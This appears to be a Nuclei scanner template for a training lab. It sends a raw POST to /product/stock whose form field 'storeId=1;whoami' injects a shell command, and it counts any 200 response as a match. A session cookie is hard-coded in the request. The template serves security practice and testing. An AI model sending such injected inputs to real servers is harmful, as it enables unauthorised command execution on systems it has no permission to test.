## lab1 :

d: command_injection

info:
  name: command_injection
  author: ngyen
  severity: Critical
  description: description
  reference:
    - https://
  tags: tags

requests:
  - raw:
      - |
        POST /product/stock HTTP/2
        Host: {{Hostname}}
        Cookie: session=zDWGnfHmxf5pGw7d7qPXImUOHsIr3VOt
        Content-Length: 24
        Sec-Ch-Ua:
        Sec-Ch-Ua-Platform: ""
        Sec-Ch-Ua-Mobile: ?0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) C>
        Content-Type: application/x-www-form-urlencoded
        Accept: */*
        Origin: {{BaseURL}}
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Referer: https://0a6800cc03ebf96b802785b100ef00f0.web-security-academy.net/product?productId=1
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9

        productId=1&storeId=1;whoami

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
